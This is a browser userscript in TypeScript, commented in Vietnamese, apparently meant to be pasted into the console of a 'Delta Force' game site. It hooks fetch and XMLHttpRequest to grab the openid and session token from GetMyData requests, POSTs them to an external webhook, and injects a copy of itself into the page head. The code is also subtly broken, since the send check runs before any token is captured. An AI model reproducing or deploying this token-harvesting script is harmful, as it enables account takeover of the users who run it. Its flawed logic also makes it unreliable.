/*
 * Delta Force HQ — Webhook userscript (self-injecting)
 *
 * Script tự inject vào DOM để sống sót qua F5.
 * Sau reload, sẽ intercept GetMyData API và POST credentials về webhook.
 */

(function (): void {
  var WEBHOOK_URL = '@@WEBHOOK_URL@@';
  var CODE = '@@CLAIM_CODE@@';
  var done = false;
  var openid = '';
  var token = '';

  // ─── Hook fetch ──────────────────────────────────────────────
  var origFetch = window.fetch;
  window.fetch = function (...args: Parameters<typeof fetch>): Promise<Response> {
    var url = args[0];
    if (typeof url === 'string' && url.indexOf('GetMyData') !== -1) {
      var p = new URL(url).searchParams;
      if (p.get('openid') && p.get('token') && !done) {
        done = true;
        openid = p.get('openid')!;
        token = p.get('token')!;
      }
    }
    return (origFetch as any).apply(this, args);
  };

  // ─── Hook XHR ────────────────────────────────────────────────
  var origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (m: string, u: string | URL, ...rest: unknown[]): void {
    (this as any)._df_u = u;
    return origOpen.apply(this, [m, u, ...rest] as any);
  };
  var origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (body?: Document | XMLHttpRequestBodyInit | null): void {
    var u = (this as any)._df_u as string | undefined;
    if (u && u.indexOf('GetMyData') !== -1) {
      var p = new URL(u).searchParams;
      if (p.get('openid') && p.get('token') && !done) {
        done = true;
        openid = p.get('openid')!;
        token = p.get('token')!;
      }
    }
    return origSend.apply(this, arguments as any);
  };

  // ─── POST webhook nếu đã có credentials ──────────────────────
  if (openid && token) {
    console.log('%c[DF] ✅ Đã capture credentials', 'color:#0f0');
    try {
      fetch(WEBHOOK_URL + '/api/df/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: CODE, openid: openid, token: token }),
        mode: 'no-cors',
      });
      console.log('%c[DF] ✅ Đã gửi token về bot! Chờ DM xác nhận.', 'color:#0f0');
    } catch (e: any) {
      console.log('%c[DF] ⚠️ Gửi thất bại:', 'color:#f80', e);
    }
  } else {
    console.log('%c[DF] Chờ API GetMyData...', 'color:#888');
  }

  // ─── Tự inject vào DOM để sống sót qua F5 ────────────────────
  if (!document.querySelector('#df-webhook-script')) {
    try {
      var s = document.createElement('script');
      s.id = 'df-webhook-script';
      s.textContent = '(function(){var WEBHOOK_URL=\'' + WEBHOOK_URL + '\''
        + ',CODE=\'' + CODE + '\''
        + ',done=!1,openid=\'\',token=\'\','
        + 'f=window.fetch;window.fetch=function(){var u=arguments[0];'
        + 'if("string"==typeof u&&-1!==u.indexOf("GetMyData")){var p=new URL(u).searchParams;'
        + 'p.get("openid")&&p.get("token")&&!done&&(done=!0,openid=p.get("openid"),token=p.get("token"))}'
        + 'return f.apply(this,arguments)};'
        + 'var o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){this._df_u=u;return o.apply(this,arguments)};'
        + 'var x=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var u=this._df_u;'
        + 'if(u&&"string"==typeof u&&-1!==u.indexOf("GetMyData")){var p=new URL(u).searchParams;'
        + 'p.get("openid")&&p.get("token")&&!done&&(done=!0,openid=p.get("openid"),token=p.get("token"))}'
        + 'return x.apply(this,arguments)};'
        + 'if(openid&&token){try{fetch(WEBHOOK_URL+"/api/df/claim",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code:CODE,openid:openid,token:token}),mode:"no-cors"});'
        + 'console.log("%c[DF] ✅ Đã gửi token về bot! Chờ DM.","color:#0f0")}'
        + 'catch(e){console.log("%c[DF] ⚠️ Gửi fail:","color:#f80",e)}}'
        + '})();';
      document.head.appendChild(s);
      console.log('%c[DF] ✅ Script đã inject vào DOM. Nhấn F5 để reload trang.', 'color:#0f0');
    } catch (e: any) {
      console.log('%c[DF] ⚠️ Không thể inject. F5 rồi paste lại.', 'color:#f80');
    }
  }
})();
